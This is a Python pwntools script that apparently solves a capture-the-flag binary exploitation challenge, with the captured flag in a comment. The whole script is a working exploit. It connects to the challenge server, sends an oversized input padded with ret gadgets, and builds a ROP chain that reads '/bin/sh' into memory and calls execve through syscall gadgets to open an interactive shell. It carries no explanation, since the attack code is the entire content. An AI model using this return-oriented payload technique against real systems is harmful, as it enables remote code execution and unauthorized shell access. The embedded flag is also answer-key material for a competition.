#flag = GLUG{g4dg3t5_4r3_us3ful_f0d96723328ffaea}
from pwn import *

target = remote("chall.nitdgplug.org", 30622)

ret     = p64(0x0000000000400416)
pop_rax = p64(0x00000000004005af)
pop_rdx = p64(0x0000000000449905)
pop_rsi = p64(0x0000000000410a63)
pop_rdi = p64(0x00000000004006a6)
sys_ret = p64(0x0000000000474c55)
_bin_sh = p64(0x00000000006b6000)

target.send("513")

payload = ""
payload += ret*(512/8 - 16)
payload += pop_rax + p64(00) + pop_rdi + p64(0) + pop_rsi + _bin_sh + sys_ret
payload += pop_rax + p64(59) + pop_rdi + _bin_sh + pop_rsi + p64(0) + pop_rdx + p64(0) + sys_ret + "\x00"

target.send(payload)

target.send("/bin/sh\x00")

target.interactive()